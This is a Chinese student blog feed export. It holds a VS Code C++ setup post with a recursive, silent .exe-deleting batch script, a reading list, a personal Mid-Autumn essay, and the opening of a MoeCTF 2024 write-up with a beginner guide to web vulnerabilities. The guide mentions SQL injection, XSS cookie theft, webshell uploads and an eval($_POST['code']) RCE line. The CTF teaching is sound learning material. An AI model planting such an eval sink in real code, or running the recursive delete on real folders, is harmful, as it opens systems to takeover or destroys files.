class="hljs-attr">&quot;tasks&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;Compile&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;g++&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-o&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;fileDirname&#125;/$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-g&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-Wall&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-static-libgcc&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-fexec-charset=GBK&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-std=c++11&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;process&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;build&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;presentation&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;echo&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;reveal&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;always&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;focus&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;panel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;shared&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><br>        <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-punctuation">&#123;</span><br>            <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;cppbuild&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;label&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;C/C++: g++.exe 生成活动文件&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;command&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;D:\\programs\\mingw64\\bin\\g++.exe&quot;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;args&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;-fdiagnostics-color=always&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-g&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;-o&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;options&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;cwd&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;$&#123;fileDirname&#125;&quot;</span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;problemMatcher&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>                <span class="hljs-string">&quot;$gcc&quot;</span><br>            <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;group&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;kind&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;build&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;isDefault&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br>            <span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br>            <span class="hljs-attr">&quot;detail&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;调试器生成的任务。&quot;</span><br>        <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>        </div>      </div>    </div>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-2f3c90d2" role="button" aria-expanded="false" aria-controls="collapse-2f3c90d2">        <div class="fold-arrow">▶</div>del.bat      </div>      <div class="fold-collapse collapse" id="collapse-2f3c90d2">        <div class="fold-content">          <figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bat"><span class="hljs-built_in">del</span> *.exe /q /s<br><span class="hljs-built_in">del</span> tempCodeRunnerFile.c /q /s<br><span class="hljs-built_in">del</span> a.out /q /s<br><span class="hljs-built_in">del</span> *.o /q /s<br></code></pre></td></tr></table></figure><p><strong>注意这个文件要在.vscode同级目录下。</strong></p>        </div>      </div>    </div><h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理:"></a>工作原理:</h1><p><strong>使用vscode要先打开一个工作区（文件夹），编写的程序也存放在这个工作区里。</strong>使用文件夹（工作区）存放一个程序项目，原则上一个文件放置一个程序项目（单文件程序可以放多个不同的程序）。在文件夹（工作区）里放置vscode的配置文件，用于配置编程所用语言及运行程序的参数，在用vscode打开文夹时加载配置文件。因此vscode可以使用几乎所有的编程语言，就是靠不同的配置放在文件夹里加以区分。</p><h1 id="分类"><a href="#分类" class="headerlink" title="分类:"></a>分类:</h1><p>除了上面给出的vscodecpp配置文件，还有其他的配置办法，对应相关用途。这里不再给出。</p><ul><li>1、vscodecpp是写c++</li><li>2、vscodeC是写c<br>这两个写是单文件程序的，多个可以都放在这里边。也可以在里边建立子文件夹。</li><li>3、cpp_project   c++多文件</li><li>4、c_project     c  多文件<br>cpp_project和c_project是写多文件程序的文件来个。一个子文件夹只能放一个多文件项</li></ul><p>注：如果有以前的程序也要把程序移动到有配置文件的文件夹内才能运行。<br>常见错误：<br>1、打开程序前，没有打开带有配置文件的文件夹；<br>2、程序没有保存在当前打开的项目文件夹里；<br>3、程序编写错误导致报错，无法运行；<br>4、文件保存时误删除扩展名（ .c或是.cpp）；<br>5、在项目文件夹又建立了下一级文件夹；<br>6、把程序保存在了配置文件所在的文件夹里（.vsocde）</p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>linux使用指南</title>
    <link href="/dong.github/2024/09/19/linuxsolution/"/>
    <url>/dong.github/2024/09/19/linuxsolution/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>用来经常查阅的Linux使用指南。</strong></p><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>hexo使用指南</title>
    <link href="/dong.github/2024/09/19/hexosolution/"/>
    <url>/dong.github/2024/09/19/hexosolution/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>用来经常查阅的hexo使用指南。</strong></p><span id="more"></span><p><a href="https://blog.csdn.net/cat_bayi/article/details/128725230">https://blog.csdn.net/cat_bayi/article/details/128725230</a></p><h3 id="常用操作"><a href="#常用操作" class="headerlink" title="常用操作:"></a>常用操作:</h3><pre><code class="hljs">hexo cleanhexo ghexo shexo dhexo ghexo new ahexo new draft ahexo publish ahexo new page a组图  &#123;% gi total n1-n2-... %&#125;      ![](url)      ![](url)      ![](url)      ![](url)      ![](url)    &#123;% endgi %&#125;数学公式&#123;% katex %&#125;    &#123;% endkatex %&#125;折叠&#123;% fold info @title %&#125;    需要折叠的一段内容，支持 markdown    &#123;% endfold %&#125;</code></pre><h3 id="Spawn-failed错误"><a href="#Spawn-failed错误" class="headerlink" title="Spawn failed错误"></a>Spawn failed错误</h3><p>重置git的deploy文件夹<br>huahua提供的方法，删除博客文件夹中的.deploy_git文件夹，然后在终端cd这个文件夹后输入git config –global core.autocrlf false</p><p>  ssh-keygen -t rsa -C “邮箱”<br>  &#x2F;c&#x2F;Users&#x2F;用户名&#x2F;.ssh&#x2F;id_rsa文件中复制密钥</p><p>  <a href="https://blog.zhheo.com/p/128998ac.html">https://blog.zhheo.com/p/128998ac.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Practice</category>
      
      <category>Tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2023学年年度书单</title>
    <link href="/dong.github/2024/09/18/book-0/"/>
    <url>/dong.github/2024/09/18/book-0/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>整理出了大概的顺序，厚颜无耻地放了一堆书，有些其实我并没有完全读懂，但这些书都是曾让我印象很深刻的书，值得一看。2023学年借过的书当然不止这些，但是~，不重要。对吧。</p><span id="more"></span><p>《孤独十讲》<br>《游戏设计：筑梦之路.万物肇始》<br>《加密与解密》<br>《Python密码学编程》<br>《数学悖论与三次数学危机》&#x2F;韩雪涛<br>《纽约人 : 我们时代的城市与人 : a city…》&#x2F;泰勒<br>《资本主义十讲》&#x2F;于松<br>《软件文化》&#x2F;覃征<br>《社会工程. 卷2, 解读肢体语言》&#x2F;豪德瑙吉<br>《社会工程 : 安全体系中的人性漏洞 : the …》&#x2F;海德纳吉<br>《互联网进化史 : 从地下室革命到上帝手机 : f…》&#x2F;麦卡洛<br>《Python网络爬虫从入门到实践》<br>《保罗·克鲁格曼：经济危机》&#x2F;李硕镇<br>《计算机是怎样跑起来的》&#x2F;矢泽久雄<br>《深入理解计算机系统》<br>《Linux就该这么学》&#x2F;刘遄<br>《图说相对论》<br>《数学建模33讲 : 数学与缤纷的世界》&#x2F;朱浩楠<br>《自尊》<br>《光学》&#x2F;郭永康<br>《美国历史 : 理想与现实》&#x2F;福纳<br>《巴黎圣母院》<br>《黑铁时代》<br>《小程序, 巧应用 : 微信小程序开发实战》&#x2F;熊普江<br>《复变函数论》&#x2F;钟玉泉<br>《黄金时代》<br>《鸿蒙App开发全流程实战》&#x2F;褚洪波<br>《背对世界》&#x2F;海登赖希</p><h2 id="分类与解释"><a href="#分类与解释" class="headerlink" title="分类与解释:"></a>分类与解释:</h2><h3 id="科学与技术"><a href="#科学与技术" class="headerlink" title="科学与技术"></a>科学与技术</h3><ul><li>《游戏设计：筑梦之路.万物肇始》：好奇那些好玩的游戏怎么来的，有什么故事？这本书介绍游戏设计的基础知识和创意过程，可以满足你的好奇心。</li><li>《加密与解密》：目前仍是认为最适合用作入门的密码学书籍或者说是网安入门书籍，探讨加密和解密技术的原理与应用，看了这本完全不用上他们乱起八糟的新生研讨课了，听教授们吹牛吹一天，不如看两页书。</li><li>《Python游戏编程》：当时把代码照着抄了一遍，就是好玩，好像没啥用~</li><li>《Python密码学编程》：使用Python语言实现密码学算法和应用的指南。</li><li>《Python网络爬虫从入门到实践》：教授如何使用Python进行网络数据抓取和分析，爬虫很实用的，不信你试试。</li><li>《计算机是怎样跑起来的》：由杨频教授推荐，确实不错，看了这本无需《计算机文化》了~</li><li>《深入理解计算机系统》：深入理解计算机系统的经典教材，涵盖硬件和软件。当时C语言编程课的期末安全项目出处，共有12个lab，那个是lab3，网上还有作者再卡耐基梅隆大学的讲课视频，受益匪浅。一本值得深入的书籍，我还会再来的。</li><li>《互联网进化史 : 从地下室革命到上帝手机 》：别的书可以不看，这本书真的必读。真的。</li><li>《Linux就该这么学》：Linux系统学习入门与实践的书籍。照着来一边，This is a new world。这个如果觉得简单就直接上《鸟叔的Linux私房菜》，研究生们都在看。</li><li>《鸿蒙App开发全流程实战》：针对华为鸿蒙系统的应用开发实战教程，等工学馆把书拿过来，实训已经结束了。。。</li><li>《小程序, 巧应用 : 微信小程序开发实战》：微信小程序的开发教程，小程序只有1M，但是功能真太强大，目前这个上手不难，微信自己的开发者平台非常好。</li><li>《复变函数论》：复变函数的高等数学教材，由钟玉泉编写。选了复变函数这门选修课，你会见到一个精彩的世界。可是，像我一样懒的话。你的学分会变得不幸。</li></ul><h3 id="数学与逻辑"><a href="#数学与逻辑" class="headerlink" title="数学与逻辑"></a>数学与逻辑</h3><ul><li>《数学悖论与三次数学危机》：探讨数学史上的悖论和危机，理解数学基础的演变，极限究竟是什么东西？数学有多么严谨？当时赵辉的通识课刚好问到了第三次数学悖论，我还上去show off了一下，哈哈哈。</li><li>《数学建模33讲 : 数学与缤纷的世界》：通过实际案例展示数学建模的应用，超级好看。</li></ul><h3 id="历史与文化"><a href="#历史与文化" class="headerlink" title="历史与文化"></a>历史与文化</h3><ul><li>《纽约人 : 我们时代的城市与人》：开阔视野，泰勒笔下的纽约城市与人文景观。</li><li>《美国历史 : 理想与现实》：由张春燕老师推荐，讲述美国历史的书籍，强调理想与现实的交织，内容丰富。</li><li>《软件文化》：《计算机文化》写得像流水账，咱还是得自己找点细糠。探讨软件背后的文化、社会和经济影响。</li></ul><h3 id="心理学与社会学"><a href="#心理学与社会学" class="headerlink" title="心理学与社会学"></a>心理学与社会学</h3><ul><li>《自尊》：关于自尊心的心理学书籍，可能涉及自尊的建立、维护及其对个人行为的影响。特别好，看了就懂。</li><li>《社会工程. 卷2, 解读肢体语言》：解读肢体语言在社会互动中的作用，后来在网安法课程中被推荐过。</li><li>《社会工程 : 安全体系中的人性漏洞》：分析社会工程学的原理及其在安全领域的应用，后来在网安法课程中被推荐过。</li></ul><h3 id="经济学"><a href="#经济学" class="headerlink" title="经济学"></a>经济学</h3><ul><li>《资本主义十讲》：对资本主义制度的深入剖析和讨论，看不懂《资本论》？看这个。</li><li>《保罗·克鲁格曼：经济危机》：通过克鲁格曼的视角分析经济危机的原因和影响，很清楚。还可以配合微观经济学的视频课看，可以感受一下经济学的神奇。</li></ul><h3 id="法学"><a href="#法学" class="headerlink" title="法学"></a>法学</h3><ul><li>《法理学》：当时去旁听被推荐到的，老师是真热情，得知是旁听还给安排了讨论小组。法理学是法学的入门基础，也是在这个领域深造的高级阶梯。介绍的是法学在做判断时使用的基本原理。</li><li>《洞穴奇案》：美国13位大法官对同一庄虚构的案件的判决书，可以看到美国法律体系判例法与中国司法体系成文法的区别，看他们辩证的过程。另外还可以发现中国的法官权力是非常集中的。</li></ul><h3 id="物理学"><a href="#物理学" class="headerlink" title="物理学"></a>物理学</h3><ul><li>《图说相对论》：学了光学不会相对论？就像洗澡洗一半给你断水。时空光锥和洛伦兹变换真是太浪漫的东西，让人着迷，让人惊奇，让人难以释怀。</li></ul><h3 id="文学与艺术"><a href="#文学与艺术" class="headerlink" title="文学与艺术"></a>文学与艺术</h3><ul><li>《孤独十讲》：“孤独是成长的开始”，不是么？台湾教授蒋勋著，看了绝不后悔。</li><li>《巴黎圣母院》：维克多·雨果的经典小说，描绘法国大革命时期的社会与人性。其实我还是没看懂。</li><li>《黑铁时代》：王小波写的，从侧面了解共和国的历史，就不再会对现代中国社会的……感到惊讶了，毕竟以前是那样的。</li><li>《黄金时代》：王小波写的。好看，爱看，有点黑色幽默，但是也很痛。</li><li>《背对世界》：可以重点看第一篇和最后一篇，感受“两个人的爱，总是背对着世界。”</li></ul><h3 id="光学与自然科学"><a href="#光学与自然科学" class="headerlink" title="光学与自然科学"></a>光学与自然科学</h3><ul><li>《光学》：光学领域的专业教材或参考书，由郭永康编写。由姚欣老师推荐。当时是在询问如何用干涉的办法解释衍射，这当然是存在密切的联系的，《大学物理学》显然没说清，只给了做题方法。《光学》用积分公式推导了光学的各个现象。理解光学是理解相对论的基础，这里是环环相扣的，值得探索（因为物理是我最喜欢的学科）。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>Book</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《不受掌控》(在读)</title>
    <link href="/dong.github/2024/09/18/book-1/"/>
    <url>/dong.github/2024/09/18/book-1/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>一方面，我们企图“掌控一切”，让世界无法再对我们说话了；另一方面，它以一种新的状态而不受掌控，我们再也无法聆听它，因为它已不再是我们能够触动(erreichbar)的了。– (德)罗萨</p><span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>Book</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>《功夫》</title>
    <link href="/dong.github/2024/09/18/movie-1/"/>
    <url>/dong.github/2024/09/18/movie-1/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>“一曲肝肠断，天涯何处觅知音。”</strong></p><span id="more"></span><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=29999535&auto=1&height=66"></iframe>]]></content>
    
    
    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>Movie</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024中秋节忏悔录</title>
    <link href="/dong.github/2024/09/16/D-midautumn2024/"/>
    <url>/dong.github/2024/09/16/D-midautumn2024/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>“许多年之后，面对一轮圆月，卷D先生将会回想起，他自己带他去见识孤独的那个遥远的下午。”</strong></p><span id="more"></span><p><img src="/dong.github/images/moon.png" alt="moon by potatoe&#39;s camera"><br><strong>“西北望乡何处是，东南见月几回圆。”</strong><br><strong>“昨风一吹无人会，今夜清光似往年。”</strong></p><p>又是一年中秋节，还是那么圆，那么亮的月亮，可惜时间飞逝，我们再也回不去了。<br>W卷：“你看今年川大的高考分数线，涨了多少，今年上川大网安需要1000多名省排了。”<br>说着，他挨个数起了班上的人，“看你超过了多少人……”<br>w卷还是像以前一样。可是他不经意间，我被戳中了。<br>从那之后，西出阳关再无故人；曲终人散，人走茶凉，往后却是一大片一大片的荒芜，是的，只有失去之后才懂得珍惜，失去后才明白有多珍贵，我不止一次地幻想着能回到过去的那些日子里，可是梦醒之后只剩下后悔。<strong>我们都太忙着赶路了，错过了太多珍贵的东西。</strong></p><p>每年的毕业季，中秋节，聚散之时，我都难以平静。<br><strong>“一个人和一个人相遇的概率是千万分之一，而他们成为朋友的概率只有两亿分之一”</strong>，人和人的相遇本身就非常不容易，而在这广袤的宇宙中，在茫茫人海中，能够有个朋友是多么幸运的事。</p><p>可惜我当时却不懂，只知道埋头苦干，没完没了的刷题，没完没了的内卷。直到今天我还都觉得，人怎么可以把事做得这么极端。一个人，每天除了吃饭睡觉就是做题，不跟别人聊天，不参与社交，到点就出去跑3公里，回去又是学习。我真是个差劲的人。是的，我嘲笑过躺平，认为那是不珍惜生命的行为，也是对自己，对自己爱的和爱自己的人事物不负责的行为。到头来想，其实最应该被讽刺的是我才对。<br>你说，生命的意义在哪里？被吹捧，被追慕，拥有花不完的金钱，用不完的权力，可以让人暂时摆脱孤独的枷锁，却终究空虚的，因为是非成败转头空，是肤浅的。<strong>而那些美好的记忆，那种打开回忆时愉悦的感觉，拿什么都换不来的。</strong></p><p>我小时候就想着，我要做个平凡、快乐的小人物，平平安安度过这平凡的一生。爸爸知道我属鸡，就叫我小名虫虫，希望我能天天开心快乐。可是到现在为止19年了，<strong>平凡是够平凡了，可是快乐到哪去了呢？</strong>还是陷入失落，在没完没了的学习中忘掉悲伤……</p><p><strong>[事件]</strong> 之后，就再无友了。曾经那些要要好一辈子的伙伴，我以为的至交，都去哪了呢。可能，这只是我的一面之交。从来都只是我给别人过生日，我用自己的失败安慰别人、取悦别人，衬托他们的成功，用自己的热情去填充别人的失落空虚。妈妈警告过我，这个就叫缺心眼，不要对别人没底线的好。朋友本身或许就是个伪命题，我当时只作不懂。后来慢慢明白了，<strong>淡了，无所谓了</strong>。可是，想起那年却唯独有一个人能记得我的生日，而我却那样对待她。我真是太差劲了。又菜又爱卷，冷落了别人，伤了别人。</p><p>朋友圈还是会看的，也是会酸的。看到别人的生活总是那么热闹，那么热烈，那么精彩，那么充实，而我却每天在宿舍做“下水道的老鼠”，还是会失落的。</p><p>如果当初，要是我能回到一节下午的自习课，我决不学习。我要全身心投入地跟你们聊天，聊未来，聊梦想，分享那青春岁月的喜与乐，悲与苦，描述那些未来的无限可能，梦想这个世界的无限精彩，和你们做最最好的朋友。<strong>如果当初呢，过去就是过去，再也回不去了。</strong>悲。</p><p>痴人说梦矣。<br>或许，此时此刻，正如彼时彼刻。<strong>不被珍惜的现在，却又是未来憧憬了无数次的过去？</strong></p><p>大学的路是陡坡，大学的朋友是荒芜。可能吗？一年已过，我已没什么期待。<br>但是卷D还是卷D，和当年一样，加快赶路的脚步了。</p><p>好。忏悔完毕，早点睡觉，明天又是工作日。</p>]]></content>
    
    
    <categories>
      
      <category>Love &amp; Life</category>
      
      <category>碎碎念</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Moe2024</title>
    <link href="/dong.github/2024/09/13/Moe2024/"/>
    <url>/dong.github/2024/09/13/Moe2024/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\dong.github\assets\css\APlayer.min.css"><script src="\dong.github\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><strong>2024MoeCTF小结，挑一些题记下笔记</strong></p><span id="more"></span><h1 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h1>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-cff048a9" role="button" aria-expanded="false" aria-controls="collapse-cff048a9">        <div class="fold-arrow">▶</div>入门指北      </div>      <div class="fold-collapse collapse" id="collapse-cff048a9">        <div class="fold-content">          <h1 id="moectf2024-web入门指北"><a href="#moectf2024-web入门指北" class="headerlink" title="moectf2024 web入门指北"></a>moectf2024 web入门指北</h1><p>xt</p><h2 id="一-web是啥"><a href="#一-web是啥" class="headerlink" title="一.web是啥"></a>一.web是啥</h2><p>互联网时代，web应用以及涉及到生活中的方方面面，与后端交互的软件呀，浏览器看到的web<br>网页呀。ctf中web一般涉及web网页安全，通过利用网页前后端的漏洞（代码漏洞也好，服务器<br>漏洞也好）获取关键数据flag，一上来首先需要大家自己搭建一个基本的网站，了解网站的基本<br>架构，连网站是怎么运行的都不知道何谈找漏洞呢。</p><h2 id="二-学习方法"><a href="#二-学习方法" class="headerlink" title="二.学习方法"></a>二.学习方法</h2><p>不懂就搜（善用ai和搜索引擎，小到软件怎么使用，大到某一个庞大的知识点，可以使用多个搜<br>索引擎，推荐google和<a href="http://www.bing），不懂就问（大雪参必备技能---脸皮厚），推荐blog网站：">www.bing），不懂就问（大雪参必备技能---脸皮厚），推荐blog网站：</a><br>先知社区，freebuf</p><h2 id="三-学习路线"><a href="#三-学习路线" class="headerlink" title="三.学习路线"></a>三.学习路线</h2><p>配置环境(最难最烦):你可以去搜教程看文档，在配置期间你可能会<br>遇到各种各种看不懂得错误，要有耐心，环境需要边学边配置，这里<br>简单列举好用的<br>1.linux操作系统需要学习（先学会简单使用shell）使用vm虚拟机装个linux发行版吧，用多了相<br>信你会喜欢linux<br>2.浏览器及其插件（hackbar，ProxySwitchyOmega，Wappalyzer）<br>3.常用工具（BurpSuite，PHPStudy，Antsword，dirsearch）安装使用想必你会自己搜叭<br>4.杂七杂八（clash，uTools，Everything）还有一些常用的网站（fofa,cmd5,站长之家）等等<br>路线指南：<br>基础知识：（目标搭建自己的第一个网站）<br>1.基本的网络协议（重点http）http的请求头请求体请求方法<br>2.编码与加解密知识，经典的base64，hash等等，需要一点基本的密码知识<br>可供参考的资料：<a href="https://www.cnblogs.com/ruoli-s/p/14206145.html">https://www.cnblogs.com/ruoli-s/p/14206145.html</a><br>3.认证方法（cookie，session，jwt）<br>4.前端三要素（html，css，javascript）css知道就好，粗体为重点<br>5.后端（先从最简单的php开始）开发简单动态网站（使用phpstudy或者手动安装lamp）<br>6.数据库（先简单学习Mysql）能实现增删改查<br>7.一个趁手的脚本语言（推荐python）能够实现简单爬虫7.学会使用重要的工具，刚开始不用陷<br>入学工具，简单学会使用burpsuite就行<br>信息搜集：<br>知道一个网站是什么框架等等<br>初探漏洞：<br>web漏洞多到数不清，先从top10学起，以下只给部分介绍，可以从php语言来看这些漏洞是如<br>何产生的，又怎样修补避免呢，攻击时怎么绕过某些阻碍</p><h3 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h3><p>就是拼接sql语句实现读取数据库信息（信息泄露），篡改，甚至删除数据库信息，有多种注入方<br>式和利用技巧，注入类的漏洞很多但都大差不差，sql注入算是经典中的经典，学习的时候不要只<br>看不操作，可以找靶场玩玩<br>推荐靶场：sql-libs</p><h3 id="2-php的安全问题"><a href="#2-php的安全问题" class="headerlink" title="2.php的安全问题"></a>2.php的安全问题</h3><p>php使用不当会容易出现很多漏洞，&#x3D;&#x3D;，&#x3D;&#x3D;&#x3D;使用不当导致php弱类型呀啥的，而且php语言太<br>灵活容易被利用<br>文件包含，主要由函数include()，require()，include_once()，require_once()造成他们包含的<br>文件会被解析成php代码执行<br>变量覆盖，关键变量能被用户控制从而导致问题<br>远程代码执行（rce），比如eval()中的代码能够让用户控制（eval($_POST[‘code’]);）<br>等等种种</p><h3 id="3-前端安全（xss-csrf等等）"><a href="#3-前端安全（xss-csrf等等）" class="headerlink" title="3.前端安全（xss, csrf等等）"></a>3.前端安全（xss, csrf等等）</h3><p>由前端造成的漏洞<br>xss：用户通过html注入篡改网页前端，一般插入javascript使得别人访问时自动运行，比如评论<br>区啥的很多很多甚至用户名都行，只要没啥过滤，都可以让浏览器渲染执行，ctf中主要是窃取<br>cookie<br>推荐靶场：xss-libs<br>Csrf: 攻击者可以使得受害者发送http的请求（如果受害者的token没过期的话，嘿嘿）</p><h3 id="4-服务端请求伪造-ssrf"><a href="#4-服务端请求伪造-ssrf" class="headerlink" title="4.服务端请求伪造(ssrf)"></a>4.服务端请求伪造(ssrf)</h3><p>用户能使服务器发送http请求，一般我们是向服务器发请求，而ssrf是使得服务器计算机发出<br>http请求</p><h3 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5.文件上传"></a>5.文件上传</h3><p>用户在上传文件功能的地方（头像呀什么的）上传可执行脚本获得shell（php一句话木马），在<br>服务器可以执行有害命令</p><h3 id="6-其他"><a href="#6-其他" class="headerlink" title="6.其他"></a>6.其他</h3><p>各种语言的反序列化，nodejs原型链污染， ssti，xxe，各种cms，组件漏洞啥的</p><h2 id="四-练习"><a href="#四-练习" class="headerlink" title="四.练习"></a>四.练习</h2><p>靶场推荐<br>攻防世界（有入门靶场）<br>Bugku<br>Buuctf<br>ctfhub<br>Nssctf<br>不会可以查看wp,一定搞清楚原理,可以学完一个漏洞就找相同类型的靶场打一打（瞎jb乱打不是<br>很建议）<br>最后建议多看书多看博客社区多了解，祝大家可以在ctf中玩的开心</p>        </div>      </div>    </div><h1 id="Pop-base-mini-moe"><a href="#Pop-base-mini-moe" class="headerlink" title="Pop base mini moe"></a>Pop base mini moe</h1><h3 id="protected和public修饰的属性在序列化中是有区别的"><a href="#protected和public修饰的属性在序列化中是有区别的" class="headerlink" title="protected和public修饰的属性在序列化中是有区别的"></a>protected和public修饰的属性在序列化中是有区别的</h3><h3 id="在实例中无法通过-obj-属性名-或方法名-来调用pravite类型的方法或属性"><a href="#在实例中无法通过-obj-属性名-或方法名-来调用pravite类型的方法或属性" class="headerlink" title="在实例中无法通过$obj-&gt;属性名(或方法名) 来调用pravite类型的方法或属性"></a>在实例中无法通过$obj-&gt;属性名(或方法名) 来调用pravite类型的方法或属性</h3><figure class="highlight 